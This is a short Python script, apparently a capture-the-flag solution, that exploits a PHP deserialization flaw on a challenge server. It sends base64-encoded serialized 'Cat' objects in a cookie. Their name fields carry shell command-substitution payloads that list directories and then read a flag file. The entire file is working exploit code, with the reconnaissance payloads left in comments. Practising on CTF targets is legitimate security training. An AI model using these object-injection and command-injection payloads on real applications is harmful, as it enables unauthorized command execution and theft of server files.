import requests

# ' $(ls ) '
#cookies={"cat_session": "TzozOiJDYXQiOjE6e3M6NDoibmFtZSI7czo5OiInICQobHMpICciO30="}

# ' $(ls /) '
#cookies={"cat_session": "TzozOiJDYXQiOjE6e3M6NDoibmFtZSI7czoxMToiJyAkKGxzIC8pICciO30="}

# ' $(cat /flag_5fb2acebf1d0c558) '
cookies={"cat_session": "TzozOiJDYXQiOjE6e3M6NDoibmFtZSI7czozMzoiJyAkKGNhdCAvZmxhZ181ZmIyYWNlYmYxZDBjNTU4KSAnIjt9"}

r = requests.get("http://h4ck3r.quest:8601/", cookies=cookies)
#print(r.content)
string = r.content.split(b'\n')
[print(string[i]) for i in range(len(string))]